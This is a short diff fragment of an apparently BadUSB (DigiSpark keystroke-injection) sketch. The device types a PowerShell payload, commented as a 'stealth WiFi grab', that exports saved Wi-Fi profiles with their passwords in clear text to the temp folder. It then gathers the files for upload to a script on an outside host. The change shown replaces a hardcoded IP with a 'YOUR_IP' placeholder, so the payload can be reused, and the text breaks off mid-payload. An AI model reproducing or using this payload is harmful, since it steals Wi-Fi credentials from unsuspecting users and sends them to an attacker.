@@ -19,7 +19,7 @@ void loop() {
 
   // Stealth WiFi grab + cleanup + exit
   DigiKeyboard.print(
-    F("$u='http://192.168.1.8/wifi-recv.php';"
+    F("$u='http://YOUR_IP/wifi-recv.php';"
       "$t=$env:TEMP;"
       "netsh wlan export profile folder=\"$t\" key=clear;"
       "$w=Get-ChildItem \"$t\\Wi-Fi-*.xml\"|ForEach-Object{"
